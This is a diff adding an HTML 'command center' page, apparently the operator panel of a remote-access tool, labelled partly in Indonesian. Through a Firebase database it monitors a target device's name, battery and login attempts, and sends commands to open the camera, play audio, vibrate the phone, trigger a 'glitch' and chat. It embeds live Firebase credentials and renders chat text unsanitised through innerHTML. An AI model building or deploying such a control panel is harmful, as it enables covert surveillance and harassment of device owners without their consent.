@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>COMMAND_CENTER V3 // FIRE_EAGLE</title>
+    <style>
+        body { background: #050000; color: #ff0000; font-family: 'Courier New', monospace; padding: 20px; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .panel { border: 2px solid #ff0000; padding: 20px; box-shadow: 0 0 15px #500; background: rgba(10,0,0,0.9); margin-bottom: 20px; }
+        h1, h2 { border-bottom: 1px solid #f00; padding-bottom: 5px; text-transform: uppercase; margin-top: 0; }
+        button { background: #200; color: #f00; border: 1px solid #f00; padding: 10px; cursor: pointer; margin: 5px 0; width: 100%; font-weight: bold; transition: 0.3s; }
+        button:hover { background: #f00; color: #000; }
+        .info { color: #0f0; font-weight: bold; }
+        .chat-box { height: 120px; border: 1px solid #300; overflow-y: auto; padding: 5px; background: #000; margin-bottom: 10px; font-size: 0.8em; color: #0f0; }
+        input[type="text"] { width: 95%; background: #100; border: 1px solid #f00; color: #0f0; padding: 8px; margin-bottom: 5px; }
+        .kill-btn { background: #444; color: #fff; border: 1px solid #888; }
+        .kill-btn:hover { background: #fff; color: #000; }
+        .emergency { background: #f00; color: #fff; border: 2px solid #fff; }
+    </style>
+</head>
+<body>
+    <h1>PHANTOM_GLITCH_PROJECT // REMOTE_ACCESS</h1>
+
+    <div class="grid">
+        <div class="panel">
+            <h2>Target Monitoring</h2>
+            <p>Device: <span id="dev-name" class="info">Detecting...</span></p>
+            <p>Battery: <span id="bat-level" class="info">0%</span></p>
+            <p>Login Attempts: <span id="attempts-count" style="color: yellow;">0</span></p>
+            <hr>
+            <h2>Chat System</h2>
+            <div id="chat-display" class="chat-box"></div>
+            <input type="text" id="chat-input" placeholder="Ketik pesan rahasia...">
+            <button onclick="sendChat()">KIRIM PESAN</button>
+        </div>
+
+        <div class="panel">
+            <h2>Remote Controls</h2>
+            <button onclick="triggerError(true)" style="background: #600;">ACTIVATE GLITCH</button>
+            <button onclick="triggerAudio(true)" style="background: #600;">PLAY AUDIO</button>
+            <button onclick="cmd('camera')" style="background: #600;">OPEN CAMERA</button>
+            <button onclick="cmd('vibrate')" style="background: #600;">VIBRATE HP</button>
+            <hr>
+            <p>Volume Control (Target):</p>
+            <input type="range" id="vol-slider" min="0" max="1" step="0.1" style="width:100%" onchange="setVolume(this.value)">
+        </div>
+    </div>
+
+    <div class="panel">
+        <h2>System Deactivation (Kill Switch)</h2>
+        <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px;">
+            <button class="kill-btn" onclick="triggerError(false)">STOP GLITCH</button>
+            <button class="kill-btn" onclick="triggerAudio(false)">STOP AUDIO</button>
+            <button class="kill-btn" onclick="cmd('stop-camera')">CLOSE CAMERA</button>
+        </div>
+        <button class="emergency" onclick="killAll()" style="margin-top:15px; height: 50px;">KILL ALL SYSTEMS (RESET TO IDLE)</button>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+    <script>
+        const firebaseConfig = {  
+            apiKey: "AIzaSyCogQ9FOG_p9N52O-2vLObWDBXyjQgDVcE",
+            authDomain: "phantom-glitch-project.firebaseapp.com",
+            databaseURL: "https://phantom-glitch-project-default-rtdb.firebaseio.com",
+            projectId: "phantom-glitch-project",
+            storageBucket: "phantom-glitch-project.firebasestorage.app",
+            messagingSenderId: "475198183760",
+            appId: "1:475198183760:web:f73e3cf7e3b471baa97455"
+        }; 
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        function triggerError(state) { db.ref('system/error').set(state); }
+        function triggerAudio(state) { db.ref('system/audio').set(state); }
+        function setVolume(val) { db.ref('system/volume').set(val); }
+        function cmd(type) { db.ref('system/command').set({type: type, time: Date.now()}); }
+
+        function killAll() {
+            db.ref('system/error').set(false);
+            db.ref('system/audio').set(false);
+            db.ref('system/command').set({type: 'stop-camera', time: Date.now()});
+            db.ref('system/chat').set({ sender: "System", text: "RESET", time: Date.now() });
+        }
+
+        function sendChat() {
+            const input = document.getElementById('chat-input');
+            if(input.value) {
+                db.ref('system/chat').set({ sender: "Admin", text: input.value, time: Date.now() });
+                input.value = "";
+            }
+        }
+
+        // Monitoring Listeners
+        db.ref('target/info').on('value', snap => {
+            const data = snap.val();
+            if(data) {
+                document.getElementById('dev-name').innerText = data.deviceName;
+                document.getElementById('bat-level').innerText = Math.round(data.battery * 100) + "%";
+            }
+        });
+
+        db.ref('system/chat').on('value', snap => {
+            const val = snap.val();
+            if(val) {
+                const box = document.getElementById('chat-display');
+                box.innerHTML += `<div>[${val.sender}]: ${val.text}</div>`;
+                box.scrollTop = box.scrollHeight;
+            }
+        });
+    </script>
+</body>
+</html>
